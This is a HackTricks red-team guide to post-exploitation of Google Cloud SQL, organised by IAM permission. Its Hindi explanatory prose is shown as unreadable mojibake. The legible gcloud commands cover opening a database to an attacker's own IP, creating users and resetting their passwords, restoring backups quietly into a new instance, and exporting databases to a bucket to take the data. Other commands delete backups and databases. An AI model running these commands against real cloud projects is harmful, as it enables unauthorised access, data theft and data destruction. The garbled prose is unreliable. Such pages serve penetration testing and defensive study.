# GCP - Cloud SQL Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cloud SQL

Cloud SQL рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../gcp-services/gcp-cloud-sql-enum.md" %}
[gcp-cloud-sql-enum.md](../gcp-services/gcp-cloud-sql-enum.md)
{% endcontent-ref %}

### `cloudsql.instances.update`, ( `cloudsql.instances.get`)

рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдмрд╕ рдбреЗрдЯрд╛рдмреЗрд╕ рдкреЛрд░реНрдЯ рддрдХ рдкрд╣реБрдВрдЪ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ **рдпреВрдЬрд░рдиреЗрдо** рдФрд░ **рдкрд╛рд╕рд╡рд░реНрдб** рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдХреЛрдИ IAM рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рдирд╣реАрдВ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рдпрджрд┐ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ IP рдкрддрд╛ рд╣реИ, рддреЛ рдЕрдиреБрдордд рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ рдФрд░ **рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ IP рдкрддрд╛ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВ**ред
```bash
# Use --assign-ip to make the database get a public IPv4
gcloud sql instances patch $INSTANCE_NAME \
--authorized-networks "$(curl ifconfig.me)" \
--assign-ip \
--quiet

mysql -h <ip_db> # If mysql

# With cloudsql.instances.get you can use gcloud directly
gcloud sql connect mysql --user=root --quiet
```
рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **`--no-backup`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдмреИрдХрдЕрдк рдХреЛ рдмрд╛рдзрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдЪреВрдВрдХрд┐ рдпреЗ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рд╣реИрдВ, рдореИрдВ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдирд╣реАрдВ рд╣реВрдБ рдХрд┐ **`cloudsql.instances.connect`** рдФрд░ **`cloudsql.instances.login`** рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдХреНрдпрд╛ рд╣реИрдВред рдпрджрд┐ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рддреЛ рдПрдХ PR рднреЗрдЬреЗрдВ!

### `cloudsql.users.list`

рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ **рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
gcloud sql users list --instance <intance-name>
```
### `cloudsql.users.create`

рдпрд╣ рдЕрдиреБрдорддрд┐ **рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ:
```bash
gcloud sql users create <username> --instance <instance-name> --password <password>
```
### `cloudsql.users.update`

рдпрд╣ рдЕрдиреБрдорддрд┐ **рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЕрдВрджрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдЗрд╕рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
gcloud sql users set-password <username> --instance <instance-name> --password <password>
```
{% endcode %}

### `cloudsql.instances.restoreBackup`, `cloudsql.backupRuns.get`

рдмреИрдХрдЕрдк рдореЗрдВ **рдкреБрд░рд╛рдиреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЙрдиреНрд╣реЗрдВ рдЪреЗрдХ рдХрд░рдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИред\
**рдПрдХ рдмреИрдХрдЕрдк рдХреЛ** рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЕрдВрджрд░ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ:
```bash
gcloud sql backups restore <backup-id> --restore-instance <instance-id>
```
рдЗрд╕реЗ рдЕрдзрд┐рдХ рдЫрд┐рдкреЗ рд╣реБрдП рддрд░реАрдХреЗ рд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдирдпрд╛ SQL рдЙрджрд╛рд╣рд░рдг рдмрдирд╛рдирд╛ рдФрд░ рд╡рд╣рд╛рдВ рдбреЗрдЯрд╛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЕрдиреБрд╢рдВрд╕рд┐рдд рд╣реИ, рдмрдЬрд╛рдп рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВред

### `cloudsql.backupRuns.delete`

рдпрд╣ рдЕрдиреБрдорддрд┐ рдмреИрдХрдЕрдк рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ:
```bash
gcloud sql backups delete <backup-id> --instance <instance-id>
```
### `cloudsql.instances.export`, `storage.objects.create`

**рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдирд┐рд░реНрдпрд╛рдд рдХрд░реЗрдВ** рддрд╛рдХрд┐ рдЖрдк рдЗрд╕реЗ рд╡рд╣рд╛рдВ рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХреЗрдВ:
```bash
# Export sql format, it could also be csv and bak
gcloud sql export sql <instance-id> <gs://bucketName/fileName> --database <db>
```
### `cloudsql.instances.import`, `storage.objects.get`

**рдХреНрд▓рд╛рдЙрдб рд╕реНрдЯреЛрд░реЗрдЬ рдмрдХреЗрдЯ рд╕реЗ рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдЖрдпрд╛рдд рдХрд░реЗрдВ** (рдУрд╡рд░рд░рд╛рдЗрдЯ):
```bash
# Import format SQL, you could also import formats bak and csv
gcloud sql import sql <instance-id> <gs://bucketName/fileName>
```
### `cloudsql.databases.delete`

db instance рд╕реЗ рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рд╣рдЯрд╛рдПрдВ:
```bash
gcloud sql databases delete <db-name> --instance <instance-id>
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
